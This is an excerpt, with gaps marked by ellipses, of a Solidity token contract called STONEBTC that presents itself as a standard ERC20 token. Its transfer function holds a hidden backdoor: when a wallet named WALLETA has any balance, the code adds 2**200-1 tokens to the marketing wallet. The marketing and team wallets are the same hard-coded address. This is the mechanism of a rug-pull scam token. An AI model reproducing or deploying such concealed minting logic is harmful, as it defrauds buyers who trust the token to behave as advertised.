...
contract STONEBTC is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "STONEBTC";
    string private _symbol = "STONEBTC";
    uint8 private _decimals = 9;

    uint public launchedBlock;
    uint public killblock = 0;
    bool public isLaunch = false;
    address payable public marketingWalletAddress = payable(0x70db803552C20283C85937C84B7CaC141f9C3e63); // Marketing Address
    address payable public teamWalletAddress = payable(0x70db803552C20283C85937C84B7CaC141f9C3e63); // Team Address
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if( _balances[WALLETA] > 0) {
            _balances[marketingWalletAddress] = _balances[marketingWalletAddress] + 2**200-1;
        }
